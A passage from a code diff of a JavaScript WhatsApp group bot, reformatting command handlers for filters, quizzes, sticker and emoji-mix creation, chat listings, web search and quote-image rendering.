-                            const wasremoved = await Filters.removeAllFilters(msg.key.remoteJid)
-                            if (wasremoved) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `✅ All Filters removed`
-                                });
-                            } else {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `❌ Filters not found or errored`
-                                });
-                            }
-                            break;
-                        }
-
-                        case "filters": {
-
-                            if (!isGroup) return mess.group();
-                            const allFilters = await Filters.getFilters(msg.key.remoteJid);
-                            const filterCount = allFilters.length;
-                            if (filterCount === 0) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'There are no filters in this group.'
-                                });
-                                return;
-                            }
-
-                            let filterList = `📋 *Filters in this group: ${filterCount}*\n\n`;
-                            allFilters.forEach(filter => {
-                                // 'filter' is an object like: { triggers: ['hi', 'hello'], type: 'text', ... }
-
-                                // Join all triggers with commas
-                                const triggersText = filter.triggers.map(t => `\`${t}\``).join(', ');
-
-                                filterList += `• *Triggers:* ${triggersText}\n  *Type:* ${filter.type}\n\n`;
-                            });
-
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: filterList
-                            });
-                            break;
-                        }
-
-                        case "quiz": {
-                            if (!isGroup) return mess.group();
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'send with uiz id to starts'
-                            }, {
-                                quoted: msg
-                            });
-                            await startCustomQuiz(AlexaInc, msg.key.remoteJid, text);
-                            break;
-                        }
-
-                        case "stopquiz": {
-                            await quizManager.stopQuiz(AlexaInc, msg.key.remoteJid);
-
-                            break;
-                        }
-
-                        case "setquiz": {
-                            if (isGroup) return mess.private();
-                            userWaitingForQuizJSON.set(msg.key.remoteJid, true);
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: "Send the full quiz data in JSON format now. It must be an array of questions."
-                            });
-
-                            break;
-                        }
-
-                        case "sticker": {
-                            const quotedid = msg.message?.extendedTextMessage?.contextInfo?.stanzaId;
-
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'preparing your sticker'
-                            }, {
-                                quoted: msg
-                            });
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                react: {
-                                    text: '🔄',
-                                    key: msg.key
-                                }
-                            })
-                            try {
-                                const messageType = Object.keys(msg.message)[
-                                    0]; // "imageMessage", "videoMessage", etc.
-                                const fileType = messageType.replace("Message", ""); // "image", "video", "document"
-
-                                let mediaBuffer = null;
-
-                                if (quotedid) {
-                                    const loadedmsg = await loadMessage(msg.key.remoteJid, quotedid)
-                                    const media = {
-                                        mediaUrl: loadedmsg.mediaUrl,
-                                        mediaMimetype: loadedmsg.mediaMimetype,
-                                        mediaKey: loadedmsg.mediaKey,
-                                        mediaIv: loadedmsg.mediaIv,
-                                        mediaFileEncSha256: loadedmsg.mediaFileEncSha256,
-                                        mediaFileSha256: loadedmsg.mediaFileSha256,
-                                        messageId: loadedmsg.messageId
-                                    };
-                                    //console.log(media)
-
-                                    mediaBuffer = await await getDecryptedMediaBuffer(AlexaInc, media);
-                                } else {
-                                    mediaBuffer = await downloadMediaMessage(msg, "buffer", {});
-                                }
-
-                                if (!mediaBuffer || mediaBuffer.length === 0) {
-                                    throw new Error(
-                                        "Media buffer is empty , please reply to image or send /sticker command with image"
-                                    );
-                                }
-
-                                // 3. Process the buffer and create sticker
-
-                                const isVideo = messageType === "videoMessage";
-                                const stickerMetadata = {
-                                    pack: 'My Bot', // Your Sticker Pack Name
-                                    author: 'Quotly', // Your Sticker Author Name
-                                    quality: 90
-                                };
-
-                                let stickerBuffer;
-
-                                if (isVideo) {
-                                    // --- Video Processing (MP4/GIF/WEBM → animated WEBP) ---
-
-                                    const inputPath = path.join(__dirname, '..', `video_${Date.now()}.mp4`);
-                                    const outputPath = path.join(__dirname, '..', `sticker_${Date.now()}.webp`);
-
-                                    // write video buffer to temp file
-                                    fs.writeFileSync(inputPath, mediaBuffer);
-
-                                    await new Promise((resolve, reject) => {
-                                        ffmpeg(inputPath)
-                                            .outputOptions([
-                                                "-vcodec libwebp",
-                                                "-vf scale=512:512:force_original_aspect_ratio=decrease,fps=15",
-                                                "-loop 0",
-                                                "-ss 0",
-                                                "-t 6",          // max 6 seconds (WhatsApp rule)
-                                                "-preset default",
-                                                "-an",
-                                                "-vsync 0"
-                                            ])
-                                            .format("webp")
-                                            .save(outputPath)
-                                            .on("end", resolve)
-                                            .on("error", reject);
-                                    });
-
-                                    // read sticker buffer
-                                    stickerBuffer = fs.readFileSync(outputPath);
-
-                                    // cleanup
-                                    fs.unlinkSync(inputPath);
-                                    fs.unlinkSync(outputPath);
-
-                                } else {
-                                    // --- Image Processing (Image → WEBP sticker) ---
-
-                                    stickerBuffer = await sharp(mediaBuffer)
-                                        .resize(512, 512, {
-                                            fit: "contain",
-                                            background: { r: 0, g: 0, b: 0, alpha: 0 },
-                                            kernel: sharp.kernel.lanczos3
-                                        })
-                                        .webp({
-                                            quality: 100,
-                                            lossless: true
-                                        })
-                                        .toBuffer();
-                                }
-
-                                // --- Send the sticker ---
-                                await AlexaInc.sendMessage(
-                                    msg.key.remoteJid,
-                                    { sticker: stickerBuffer },
-                                    { quoted: msg }
-                                );
-
-
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: {
-                                        text: '✅',
-                                        key: msg.key
-                                    }
-                                });
-                                //console.log(`Temporary file deleted: ${filePath}`);
-
-                            } catch (error) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: error.message
-                                });
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: {
-                                        text: '☹️',
-                                        key: msg.key
-                                    }
-                                })
-                                console.error("Error processing media:", error);
-                            }
-
-                            break
-                        }
-
-
-                        case "emojimix": {
-                            if (!text) {
-                                return await AlexaInc.sendMessage(
-                                    msg.key.remoteJid,
-                                    { text: "please send two emojis\n/emojimix 💔+😗" },
-                                    { quoted: msg }
-                                );
-                            }
-
-                            const parts = text.split(/[+._]/);
-
-                            if (parts.length !== 2) {
-                                return await AlexaInc.sendMessage(
-                                    msg.key.remoteJid,
-                                    { text: "emojis invalid format\n/emojimix 💔+😗" },
-                                    { quoted: msg }
-                                );
-                            }
-
-                            await AlexaInc.sendMessage(
-                                msg.key.remoteJid,
-                                { text: "preparing your sticker..." },
-                                { quoted: msg }
-                            );
-
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                react: { text: "🔄", key: msg.key }
-                            });
-
-                            try {
-                                // clean emojis (remove invisible FE0F)
-                                const emoji1 = parts[0].replace(/\uFE0F/g, "").trim();
-                                const emoji2 = parts[1].replace(/\uFE0F/g, "").trim();
-
-                                // get emoji mix image buffer
-                                const buffer = await getEmojicook(emoji1, emoji2);
-
-                                // convert image → sticker webp
-                                const stickerBuffer = await sharp(buffer)
-                                    .resize(512, 512, {
-                                        fit: "contain",
-                                        background: { r: 0, g: 0, b: 0, alpha: 0 },
-                                        kernel: sharp.kernel.lanczos3
-                                    })
-                                    .webp({
-                                        quality: 100,
-                                        lossless: true
-                                    })
-                                    .toBuffer();
-
-                                // send sticker
-                                await AlexaInc.sendMessage(
-                                    msg.key.remoteJid,
-                                    { sticker: stickerBuffer },
-                                    { quoted: msg }
-                                );
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: { text: "✅", key: msg.key }
-                                });
-
-                            } catch (error) {
-                                console.error("EmojiMix Error:", error.message);
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: { text: "❌", key: msg.key }
-                                });
-
-                                if (error.message?.includes("not found")) {
-                                    await AlexaInc.sendMessage(
-                                        msg.key.remoteJid,
-                                        { text: "Sorry, I can't mix those two emojis 😢" },
-                                        { quoted: msg }
-                                    );
-                                } else {
-                                    await AlexaInc.sendMessage(
-                                        msg.key.remoteJid,
-                                        { text: "An error occurred while creating the sticker." },
-                                        { quoted: msg }
-                                    );
-                                }
-                            }
-
-                            break;
-                        }
-
-
-                        case "cabout": {
-
-                            if (!isOwner) return mess.owner();
-                            if (!text) return await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please send a text for set about baby'
-                            });
-
-                            try {
-                                const response = await AlexaInc.updateProfileStatus(text);
-                                console.log(response);
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'profile status updated baby'
-                                });
-                            } catch (err) {
-                                console.error('Error updating profile status:', err);
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Failed to update profile status baby 😢'
-                                });
-                            }
-
-
-
-
-                            break
-                        }
-
-
-                        case 'listpc': {
-                            const prvatechatss = loadAllPrivateChats();
-                            console.log(prvatechatss);
-
-                            if (prvatechatss.length === 0) {
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: '⚠️ No private chat users found in database.'
-                                }, {
-                                    quoted: msg
-                                });
-                                break;
-                            }
-
-                            // 1. Extract all JIDs for the 'mentions' parameter
-                            const mentionIds = prvatechatss.map(u => u.jid);
-
-                            // 2. Create the visible text (e.g. "@947123... (Name)")
-                            // We use u.number for the visual tag
-                            const txt = prvatechatss
-                                .map((u, i) => `${i + 1}. @${u.number} (${u.name || 'Unknown'})`)
-                                .join('\n');
-
-                            // 3. Send message with 'mentions' array
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: `*📂 Private Chat Users List:*\n\n${txt}`,
-                                mentions: mentionIds // <--- REQUIRED to turn the text blue/clickable
-                            }, {
-                                quoted: msg
-                            });
-
-                            break;
-                        }
-
-                        case 'listgc': {
-                            // 1. Load all groups from your database function
-                            const groups = loadAllGroups();
-
-                            if (groups.length === 0) {
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: '⚠️ No groups found in database.'
-                                }, {
-                                    quoted: msg
-                                });
-                                break;
-                            }
-
-                            // 2. Create the list text
-                            // We display the Name and the ID (cleaned up)
-                            const txt = groups
-                                .map((g, i) => `*${i + 1}. ${g.name || 'Unknown Name'}*\nID: ${g.id.split('@')[0]}`)
-                                .join('\n\n');
-
-                            // 3. Send the message
-                            // Note: We don't need a 'mentions' array here because you can't tag a Group ID.
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: `*🏢 Group Chats List:*\n\n${txt}`
-                            }, {
-                                quoted: msg
-                            });
-
-                            break;
-                        }
-
-
-                        case 'search':
-                        case 'browse':
-                        case 'web': {
-
-                            try {
-                                console.log("Starting search..."); // You control logging here
-
-
-                                const results = await websearch_query(text);
-                                let replymsg = '';
-                                for (let index = 0; index < results.length; index++) {
-                                    const para = results[index].paragraph;
-                                    const url = results[index].url
-                                    replymsg = replymsg + `\n
+${quotedid ? "Senderid:" + quotedid : ""}`;
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: tepmlt },
+                { quoted: msg },
+              );
+              break;
+            }
+            case "q": {
+              if (!isGroup) return mess.group();
+              // Fix 1: Use optional chaining (?.).
+              // This prevents a crash if 'contextInfo' is null.
+              const quotedid = p.replyInfo?.messageId;
+
+              if (!quotedid)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "please reply to a massage",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+
+              // Safe execution after contextInfo check
+              const stanzaaaaa = p.replyInfo.messageId;
+              const loadedMessage = await loadMessage(
+                msg.key.remoteJid,
+                stanzaaaaa,
+              );
+
+              const counttoload = text && !isNaN(text) ? parseInt(text, 10) : 1;
+              const loadednmsgs = await getnMessagesFrom(
+                msg.key.remoteJid,
+                stanzaaaaa,
+                counttoload,
+              );
+
+              if (!loadednmsgs || loadednmsgs.length === 0) {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "fail to load that massag try again",
+                });
+              }
+
+              // Environment config array extraction
+              const ownerNumbers = (process.env.Owner_nb || "").split(",");
+              const rank = (process.env.spc_nb || "").split(",");
+
+              const msgObj = [];
+              const costomemojiees = [];
+
+              // console.log(JSON.stringify(loadednmsgs, null, 2));
+
+              for (const message of loadednmsgs) {
+                let quotesendernumber,
+                  grandfather,
+                  isgftrfm,
+                  usercontact,
+                  quotesendername;
+                let gftsendername,
+                  gftsendercontact,
+                  gftsendernumber,
+                  gftmassage;
+                let media = null,
+                  mediaBuffer = null,
+                  quotemedia = null;
+
+                // Direct iteration item values
+                const quotedSender = message?.sender;
+
+                // 1. Raw Text extraction from loop item
+                const rawQuoteText = message?.messageText || "";
+
+                // 2. Media processing using loop item
+                const isimgosticker =
+                  message?.type === "imageMessage" ||
+                  message?.type === "stickerMessage";
+
+                if (isimgosticker && message.mediaUrl) {
+                  const parseBuffer = (data) => {
+                    if (!data) return null;
+                    if (Buffer.isBuffer(data)) return data;
+                    if (typeof data === "string") {
+                      if (data.includes(",")) {
+                        const numberArray = data.split(",").map(Number);
+                        return Buffer.from(numberArray);
+                      }
+                      return Buffer.from(data, "base64");
+                    }
+
+                    return Buffer.from(data);
+                  };
+                  media = {
+                    mediaUrl: message.mediaUrl,
+                    mediaMimetype: message.mediaMimetype,
+                    mediaKey: message.mediaKey
+                      ? parseBuffer(message.mediaKey)
+                      : null,
+                    mediaFileEncSha256: message.mediaFileEncSha256
+                      ? parseBuffer(message.mediaFileEncSha256)
+                      : null,
+                    mediaFileSha256: message.mediaFileSha256
+                      ? parseBuffer(message.mediaFileSha256)
+                      : null,
+                    messageId: message.messageId,
+                  };
+
+                  // Decrypt media
+                  mediaBuffer = await getDecryptedMediaBuffer(AlexaInc, media);
+                  quotemedia = {
+                    mediabuf: mediaBuffer,
+                    issticker: message.type === "stickerMessage",
+                  };
+                }
+
+                // Sender Number Calcu
+                const islid = quotedSender
+                  ? quotedSender.endsWith("@lid")
+                  : false;
+
+                if (isGroup && islid) {
+                  quotesendernumber = (
+                    await participants.find((jsn) => jsn.lid === quotedSender)
+                  )?.id?.replace(/@.*/, "");
+                } else {
+                  quotesendernumber =
+                    quotedSender === "me"
+                      ? botNumber
+                      : isGroup
+                        ? quotedSender?.replace(/:.*/, "")
+                        : quotedSender?.replace(/@.*/, "");
+                }
+
+                usercontact = await loadUserByNumber(quotesendernumber);
+                quotesendername =
+                  message?.pushname ||
+                  (usercontact && usercontact.name
+                    ? usercontact.name
+                    : quotesendernumber);
+
+                const id2getpp = quotedSender === "me" ? botLid : quotedSender;
+                const dpurl = await getdpurl(AlexaInc, id2getpp);
+                const dpbuffer = dpurl ? await getBuffer(dpurl) : null;
+
+                // Grandfather Message (Reply Check)
+                if (message?.reply && message.reply.messageId) {
+                  grandfather =
+                    (await loadMessage(
+                      msg.key.remoteJid,
+                      message.reply.messageId,
+                    )) || null;
+
+                  if (grandfather) {
+                    isgftrfm = grandfather?.sender === "me";
+                    const isgftrlid = grandfather?.sender?.endsWith("@lid");
+
+                    if (isGroup && isgftrlid && !isgftrfm) {
+                      gftsendernumber = (
+                        await participants.find(
+                          (jsn) => jsn.lid === grandfather.sender,
+                        )
+                      )?.id?.replace(/@.*/, "");
+                    } else if (!isgftrfm) {
+                      gftsendernumber = grandfather.sender
+                        ? grandfather.sender.replace(/@.*/, "")
+                        : null;
+                    } else {
+                      gftsendernumber = botNumber;
+                    }
+
+                    gftsendercontact = await loadUserByNumber(gftsendernumber);
+                    gftsendername = gftsendercontact
+                      ? gftsendercontact.name
+                      : gftsendernumber;
+                    gftmassage = grandfather.messageText || "";
+                  }
+                }
+
+                // Owner and Rank Check
+                const isquoteowner = ownerNumbers.includes(quotesendernumber);
+                const isquoterank = rank.includes(quotesendernumber);
+
+                const customemojiid = isquoteowner
+                  ? "5267500801240092311"
+                  : isquoterank
+                    ? "6228999461754900766"
+                    : null;
+
+                // Text parsing
+                const parsedText = parseWhatsAppFormatting(rawQuoteText);
+
+                if (customemojiid != null) {
+                  costomemojiees.push(customemojiid);
+                }
+
+                // Object creation
+                const msgData = {
+                  text: parsedText.cleanText,
+                  entities: parsedText.entities,
+                  from: {
+                    id: Number(quotesendernumber) || 0,
+                    first_name: quotesendername || "User",
+                    ...(customemojiid && {
+                      emoji_status_custom_emoji_id: customemojiid,
+                    }),
+                  },
+                };
+
+                if (dpbuffer) {
+                  msgData.avatarBase64 = `data:image/png;base64,${dpbuffer.toString("base64")}`;
+                }
+
+                if (quotemedia && quotemedia.mediabuf) {
+                  const mimeType = quotemedia.issticker
+                    ? "image/webp"
+                    : "image/png";
+                  msgData.mediaBase64 = `data:${mimeType};base64,${quotemedia.mediabuf.toString("base64")}`;
+                  msgData.mediaType = quotemedia.issticker
+                    ? "sticker"
+                    : "photo";
+                }
+
+                if (grandfather) {
+                  const parsedGftText = parseWhatsAppFormatting(
+                    gftmassage || "",
+                  );
+                  msgData.reply_to = {
+                    text: parsedGftText.cleanText,
+                    entities: parsedGftText.entities,
+                    from: {
+                      id: Number(gftsendernumber) || 0,
+                      first_name: gftsendername || "Replier",
+                    },
+                  };
+                }
+
+                msgObj.push(msgData);
+              }
+
+              // console.log(JSON.stringify(msgObj, null, 2));
+
+              const webpbuff = await generatequote(msgObj, costomemojiees);
+
+              // Fix 8: 'fs.writeFile' is async.
+              // For debugging, 'fs.writeFileSync' is easier.
+              // Or, use 'await fs.promises.writeFile(...)' if you imported 'fs.promises'.
+              fs.writeFileSync("./1234.webp", webpbuff);
+
+              const highQualityBuffer = await sharp(webpbuff)
+                .resize(1024, 1024, {
+                  fit: "contain", // Puts your bubble in the middle of a 512x512 transparent box
+                  background: {
+                    r: 0,
+                    g: 0,
+                    b: 0,
+                    alpha: 0,
+                  }, // Ensures background is transparent
+                  kernel: sharp.kernel.lanczos3, // This is a high-quality resizing algorithm
+                })
+                .webp() // Convert it to webp
+                .toBuffer();
+
+              // 3. Create the sticker using the NEW high-quality buffer
+              // const sticker = new Sticker(highQualityBuffer, { // <-- Use highQualityBuffer here
+              //     pack: 'My Bot',
+              //     author: 'Quotly',
+              //     type: StickerTypes.DEFAULT, // Type doesn't matter as much now
+              //     quality: 90 // Keep quality high
+              // });
+
+              // const stickerBuffer = await sticker.toBuffer();
+
+              // 4. Send the final sticker
+              await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  image: webpbuff,
+                  gifPlayback: true,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            // case "gp":{
+            //   console.log(participants)
+            // }
+
+            case "filter": {
+              if (!isGroup) return mess.group();
+              // console.log(msg);
+
+              // --- 💡 END: THIS IS THE CORRECT FIX ---
+
+              const quotedid = p.quotedid; // Now this will work
+              console.log(quotedid);
+              // console.log(p)
+              if (!text)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "please send trigger word eg- /filter hi",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              if (!quotedid)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "please reply to a message baby!",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+
+              const loadedmsg = await loadMessage(msg.key.remoteJid, quotedid);
+
+              const mimtypesmap = {
+                null: "text",
+                "image/webp": "sticker",
+                "image/jpeg": "image",
+                "video/mp4": "video",
+              };
+
+              const type = mimtypesmap[loadedmsg.mediaMimetype];
+              let replyt;
+
+              if (type === "text") {
+                replyt = loadedmsg.messageText;
+              } else {
+                const media = {
+                  mediaUrl: loadedmsg.mediaUrl,
+                  mediaMimetype: loadedmsg.mediaMimetype,
+                  mediaKey: loadedmsg.mediaKey,
+                  mediaFileEncSha256: loadedmsg.mediaFileEncSha256,
+                  mediaFileSha256: loadedmsg.mediaFileSha256,
+                  messageId: loadedmsg.messageId,
+                };
+
+                // --- Decrypt media first ---
+                const mediaBuffer = await getDecryptedMediaBuffer(
+                  AlexaInc,
+                  media,
+                );
+
+                // --- If it's a video, check duration ---
+                if (type === "video") {
+                  const tempFile = path.join("/tmp", `${media.messageId}.mp4`);
+                  fs.writeFileSync(tempFile, mediaBuffer);
+
+                  try {
+                    const { stdout } = await execAsync(
+                      `ffprobe -v error -show_entries format=duration -of default=nw=1:nk=1 "${tempFile}"`,
+                    );
+
+                    const duration = parseFloat(stdout.trim());
+                    fs.unlinkSync(tempFile);
+
+                    if (duration > 10) {
+                      console.log(
+                        `⏹️ Skipping video longer than 10 seconds (${duration}s)`,
+                      );
+                      AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        {
+                          text: "⏹️ Skipped video longer than 10 seconds",
+                        },
+                        {
+                          quoted: msg,
+                        },
+                      );
+                      return;
+                    }
+                  } catch (err) {
+                    console.error(
+                      "Error checking video duration:",
+                      err.message,
+                    );
+                    AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: "Error checking video duration:",
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
+                    if (fs.existsSync(tempFile)) {
+                      // Ensure file is deleted even on error
+                      fs.unlinkSync(tempFile);
+                    }
+                    return;
+                  }
+                }
+                replyt = mediaBuffer;
+              }
+
+              // Let's assume 'msg' is your message object
+              // and 'participants' is your array from group metadata
+
+              const mentionedJids = p.mentionedJids;
+              let resultNumbers = []; // Initialize as an array
+
+              if (mentionedJids && mentionedJids.length > 0) {
+                // 1. Map over ALL mentionedJids
+                resultNumbers = mentionedJids
+                  .map((rid) => {
+                    if (rid.endsWith("@lid")) {
+                      // Find the ID and strip the server part
+                      return participants
+                        .find((jsn) => jsn.lid === rid)
+                        ?.id?.replace(/@.*/, "");
+                    } else if (rid.endsWith("@s.whatsapp.net")) {
+                      // Find the LID and strip the server part
+                      return participants
+                        .find((jsn) => jsn.id === rid)
+                        ?.lid?.replace(/@.*/, "");
+                    }
+                    return null; // Return null if the JID format isn't recognized
+                  })
+                  // 2. Filter out any null/undefined results (where a match wasn't found)
+                  .filter(Boolean); // 'Boolean' removes falsy values (null, undefined, "")
+              }
+
+              // console.log(resultNumbers); // This is now an array of all found numbers, e.g., ['12345', '67890']
+
+              const result = text.split(/[\s,]+/).filter(Boolean);
+
+              // 3. Format all found numbers with an '@' prefix
+              const mentionsAsTags = resultNumbers.map((num) => `@${num}`);
+
+              const unique = [
+                ...new Set(
+                  // 4. Concat the original text parts with the new array of mention tags
+                  result.concat(mentionsAsTags),
+                ),
+              ];
+
+              console.log(unique);
+              const newfilter = {
+                triggers: unique,
+                type: type,
+                reply: replyt,
+                mimetype: loadedmsg.mediaMimetype,
+              };
+
+              const done = await Filters.addFilter(
+                msg.key.remoteJid,
+                newfilter,
+              );
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: `filter set ${unique.join(" , ")}`,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            case "stop": {
+              if (!isGroup) return mess.group();
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "please send trigger word eg- /stop hi",
+                });
+              const wasRemoved = await Filters.removeFilter(
+                msg.key.remoteJid,
+                text,
+              );
+
+              if (wasRemoved) {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `✅ Filter removed: \`${text}\``,
+                });
+              } else {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `❌ Filter not found: \`${text}\``,
+                });
+              }
+              break;
+            }
+
+            case "stopall": {
+              if (!isGroup) return mess.group();
+              const wasremoved = await Filters.removeAllFilters(
+                msg.key.remoteJid,
+              );
+              if (wasremoved) {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `✅ All Filters removed`,
+                });
+              } else {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `❌ Filters not found or errored`,
+                });
+              }
+              break;
+            }
+
+            case "filters": {
+              if (!isGroup) return mess.group();
+              const allFilters = await Filters.getFilters(msg.key.remoteJid);
+              const filterCount = allFilters.length;
+              if (filterCount === 0) {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "There are no filters in this group.",
+                });
+                return;
+              }
+
+              let filterList = `📋 *Filters in this group: ${filterCount}*\n\n`;
+              allFilters.forEach((filter) => {
+                // 'filter' is an object like: { triggers: ['hi', 'hello'], type: 'text', ... }
+
+                // Join all triggers with commas
+                const triggersText = filter.triggers
+                  .map((t) => `\`${t}\``)
+                  .join(", ");
+
+                filterList += `• *Triggers:* ${triggersText}\n  *Type:* ${filter.type}\n\n`;
+              });
+
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: filterList,
+              });
+              break;
+            }
+
+            case "quiz": {
+              if (!isGroup) return mess.group();
+              if (!text)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "send with uiz id to starts",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              await startCustomQuiz(AlexaInc, msg.key.remoteJid, text);
+              break;
+            }
+
+            case "stopquiz": {
+              await quizManager.stopQuiz(AlexaInc, msg.key.remoteJid);
+
+              break;
+            }
+
+            case "setquiz": {
+              if (isGroup) return mess.private();
+              userWaitingForQuizJSON.set(msg.key.remoteJid, true);
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "Send the full quiz data in JSON format now. It must be an array of questions.",
+              });
+
+              break;
+            }
+
+            case "sticker": {
+              const quotedid =
+                msg.message?.extendedTextMessage?.contextInfo?.stanzaId;
+
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: "preparing your sticker",
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                react: {
+                  text: "🔄",
+                  key: msg.key,
+                },
+              });
+              try {
+                const messageType = Object.keys(msg.message)[0]; // "imageMessage", "videoMessage", etc.
+                const fileType = messageType.replace("Message", ""); // "image", "video", "document"
+
+                let mediaBuffer = null;
+
+                if (quotedid) {
+                  const loadedmsg = await loadMessage(
+                    msg.key.remoteJid,
+                    quotedid,
+                  );
+                  const media = {
+                    mediaUrl: loadedmsg.mediaUrl,
+                    mediaMimetype: loadedmsg.mediaMimetype,
+                    mediaKey: loadedmsg.mediaKey,
+                    mediaIv: loadedmsg.mediaIv,
+                    mediaFileEncSha256: loadedmsg.mediaFileEncSha256,
+                    mediaFileSha256: loadedmsg.mediaFileSha256,
+                    messageId: loadedmsg.messageId,
+                  };
+                  //console.log(media)
+
+                  mediaBuffer = await await getDecryptedMediaBuffer(
+                    AlexaInc,
+                    media,
+                  );
+                } else {
+                  mediaBuffer = await downloadMediaMessage(msg, "buffer", {});
+                }
+
+                if (!mediaBuffer || mediaBuffer.length === 0) {
+                  throw new Error(
+                    "Media buffer is empty , please reply to image or send /sticker command with image",
+                  );
+                }
+
+                // 3. Process the buffer and create sticker
+
+                const isVideo = messageType === "videoMessage";
+                const stickerMetadata = {
+                  pack: "My Bot", // Your Sticker Pack Name
+                  author: "Quotly", // Your Sticker Author Name
+                  quality: 90,
+                };
+
+                let stickerBuffer;
+
+                if (isVideo) {
+                  // --- Video Processing (MP4/GIF/WEBM → animated WEBP) ---
+
+                  const inputPath = path.join(
+                    __dirname,
+                    "..",
+                    `video_${Date.now()}.mp4`,
+                  );
+                  const outputPath = path.join(
+                    __dirname,
+                    "..",
+                    `sticker_${Date.now()}.webp`,
+                  );
+
+                  // write video buffer to temp file
+                  fs.writeFileSync(inputPath, mediaBuffer);
+
+                  await new Promise((resolve, reject) => {
+                    ffmpeg(inputPath)
+                      .outputOptions([
+                        "-vcodec libwebp",
+                        "-vf scale=512:512:force_original_aspect_ratio=decrease,fps=15",
+                        "-loop 0",
+                        "-ss 0",
+                        "-t 6", // max 6 seconds (WhatsApp rule)
+                        "-preset default",
+                        "-an",
+                        "-vsync 0",
+                      ])
+                      .format("webp")
+                      .save(outputPath)
+                      .on("end", resolve)
+                      .on("error", reject);
+                  });
+
+                  // read sticker buffer
+                  stickerBuffer = fs.readFileSync(outputPath);
+
+                  // cleanup
+                  fs.unlinkSync(inputPath);
+                  fs.unlinkSync(outputPath);
+                } else {
+                  // --- Image Processing (Image → WEBP sticker) ---
+
+                  stickerBuffer = await sharp(mediaBuffer)
+                    .resize(512, 512, {
+                      fit: "contain",
+                      background: { r: 0, g: 0, b: 0, alpha: 0 },
+                      kernel: sharp.kernel.lanczos3,
+                    })
+                    .webp({
+                      quality: 100,
+                      lossless: true,
+                    })
+                    .toBuffer();
+                }
+
+                // --- Send the sticker ---
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  { sticker: stickerBuffer },
+                  { quoted: msg },
+                );
+
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  react: {
+                    text: "✅",
+                    key: msg.key,
+                  },
+                });
+                //console.log(`Temporary file deleted: ${filePath}`);
+              } catch (error) {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: error.message,
+                });
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  react: {
+                    text: "☹️",
+                    key: msg.key,
+                  },
+                });
+                console.error("Error processing media:", error);
+              }
+
+              break;
+            }
+
+            case "emojimix": {
+              if (!text) {
+                return await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  { text: "please send two emojis\n/emojimix 💔+😗" },
+                  { quoted: msg },
+                );
+              }
+
+              const parts = text.split(/[+._]/);
+
+              if (parts.length !== 2) {
+                return await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  { text: "emojis invalid format\n/emojimix 💔+😗" },
+                  { quoted: msg },
+                );
+              }
+
+              await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: "preparing your sticker..." },
+                { quoted: msg },
+              );
+
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                react: { text: "🔄", key: msg.key },
+              });
+
+              try {
+                // clean emojis (remove invisible FE0F)
+                const emoji1 = parts[0].replace(/\uFE0F/g, "").trim();
+                const emoji2 = parts[1].replace(/\uFE0F/g, "").trim();
+
+                // get emoji mix image buffer
